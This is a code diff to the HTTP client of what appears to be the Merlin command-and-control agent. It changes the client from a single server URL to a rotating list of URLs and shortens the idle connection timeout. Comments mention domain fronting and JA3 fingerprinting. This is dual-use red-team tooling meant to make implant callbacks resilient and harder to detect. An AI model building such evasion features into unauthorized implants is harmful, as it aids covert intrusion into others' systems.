@@ -55,7 +55,7 @@ type Client struct {
 	clients.MerlinClient
 	Client     *http.Client // Client to send messages with
 	Protocol   string
-	URL        string            // URL to send messages to (e.g., https://127.0.0.1:443/test.php)
+	URL        []string          // A slice of URLs to send messages to (e.g., https://127.0.0.1:443/test.php)
 	Host       string            // HTTP Host header value
 	Proxy      string            // Proxy string
 	JWT        string            // JSON Web Token for authorization
@@ -67,6 +67,7 @@ type Client struct {
 	psk        string            // PSK is the Pre-Shared Key secret the agent will use to start authentication
 	AgentID    uuid.UUID         // TODO can this be recovered through reflection since client is embedded into agent?
 	opaque     *opaque.User      // TODO Turn this into a generic authentication package interface
+	currentURL int               // the current URL the agent is communicating with
 }
 
 // Config is a structure that is used to pass in all necessary information to instantiate a new Client
@@ -74,7 +75,7 @@ type Config struct {
 	AgentID     uuid.UUID // The Agent's UUID
 	Protocol    string    // Proto contains the transportation protocol the agent is using (i.e. http2 or http3)
 	Host        string    // Host is used with the HTTP Host header for Domain Fronting activities
-	URL         string    // URL is the protocol, domain, and page that the agent will communicate with (e.g., https://google.com/test.aspx)
+	URL         []string  // URL is the protocol, domain, and page that the agent will communicate with (e.g., https://google.com/test.aspx)
 	Proxy       string    // Proxy is the URL of the proxy that all traffic needs to go through, if applicable
 	UserAgent   string    // UserAgent is the HTTP User-Agent header string that Agent will use while sending traffic
 	PSK         string    // PSK is the Pre-Shared Key secret the agent will use to start authentication
@@ -124,7 +125,7 @@ func New(config Config) (*Client, error) {
 
 	cli.Message(cli.INFO, "Client information:")
 	cli.Message(cli.INFO, fmt.Sprintf("\tProtocol: %s", client.Protocol))
-	cli.Message(cli.INFO, fmt.Sprintf("\tURL: %s", client.URL))
+	cli.Message(cli.INFO, fmt.Sprintf("\tURL: %v", client.URL))
 	cli.Message(cli.INFO, fmt.Sprintf("\tUser-Agent: %s", client.UserAgent))
 	cli.Message(cli.INFO, fmt.Sprintf("\tHTTP Host Header: %s", client.Host))
 	cli.Message(cli.INFO, fmt.Sprintf("\tProxy: %s", client.Proxy))
@@ -221,11 +222,13 @@ func getClient(protocol string, proxyURL string, ja3 string) (*http.Client, erro
 			TLSClientConfig: TLSConfig,
 			MaxIdleConns:    10,
 			Proxy:           proxy,
+			IdleConnTimeout: 1 * time.Nanosecond,
 		}
 	case "http":
 		transport = &http.Transport{
-			MaxIdleConns: 10,
-			Proxy:        proxy,
+			MaxIdleConns:    10,
+			Proxy:           proxy,
+			IdleConnTimeout: 1 * time.Nanosecond,
 		}
 	default:
 		return nil, fmt.Errorf("%s is not a valid client protocol", protocol)
@@ -284,7 +287,7 @@ func (client *Client) getJWT() (string, error) {
 // This is where the client's logic is for communicating with the server.
 func (client *Client) SendMerlinMessage(m messages.Base) (messages.Base, error) {
 	cli.Message(cli.DEBUG, "Entering into agent.sendMessage()")
-	cli.Message(cli.NOTE, fmt.Sprintf("Sending %s message to %s", messages.String(m.Type), client.URL))
+	cli.Message(cli.NOTE, fmt.Sprintf("Sending %s message to %s", messages.String(m.Type), client.URL[client.currentURL]))
 
 	// Set the message padding
 	m.Padding = core.RandStringBytesMaskImprSrc(client.PaddingMax)
@@ -311,7 +314,7 @@ func (client *Client) SendMerlinMessage(m messages.Base) (messages.Base, error) 
 		return returnMessage, fmt.Errorf("there was an error encoding the %s JWE string to a gob:\r\n%s", messages.String(m.Type), errJWEBuffer.Error())
 	}
 
-	req, reqErr := http.NewRequest("POST", client.URL, jweBytes)
+	req, reqErr := http.NewRequest("POST", client.URL[client.currentURL], jweBytes)
 	if reqErr != nil {
 		return returnMessage, fmt.Errorf("there was an error building the HTTP request:\r\n%s", reqErr.Error())
 	}
@@ -326,6 +329,13 @@ func (client *Client) SendMerlinMessage(m messages.Base) (messages.Base, error) 
 	}
 	for header, value := range client.Headers {
 		req.Header.Set(header, value)
+	}
+
+	// Rotate URL
+	if client.currentURL < (len(client.URL) - 1) {
+		client.currentURL++
+	} else {
+		client.currentURL = 0
 	}
 
 	// Send the request
